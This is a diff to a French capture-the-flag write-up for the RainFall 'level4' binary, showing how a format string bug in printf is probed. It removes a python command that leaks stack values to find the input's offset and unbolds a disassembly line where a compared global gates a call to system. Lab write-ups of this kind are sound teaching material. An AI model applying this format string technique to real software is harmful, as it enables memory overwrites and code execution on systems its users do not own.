@@ -6,7 +6,7 @@ La fonction p() fait un appel a printf de maniere non securise, nous allons donc
 Nous allons d'abord chercher l'offset sur lequel ce printf ecrase la memoire:
 
 ```
-level4@RainFall:~$ python -c 'print("AAAA" + "%08x." * 24)' | ./level4 | grep 41
+
 AAAAb7ff26b0.bffff794.b7fd0ff4.00000000.00000000.bffff758.0804848d.bffff550.00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
 ```
 
@@ -69,7 +69,7 @@ Dump of assembler code for function n:
    0x08048485 <+46>:	mov    %eax,(%esp)
    0x08048488 <+49>:	call   0x8048444 <p>
    0x0804848d <+54>:	mov    0x8049810,%eax
-   **0x08048492 <+59>:	cmp    $0x1025544,%eax**
+   0x08048492 <+59>:	cmp    $0x1025544,%eax
    0x08048497 <+64>:	jne    0x80484a5 <n+78>
    0x08048499 <+66>:	movl   $0x8048590,(%esp)
    0x080484a0 <+73>:	call   0x8048360 <system@plt>
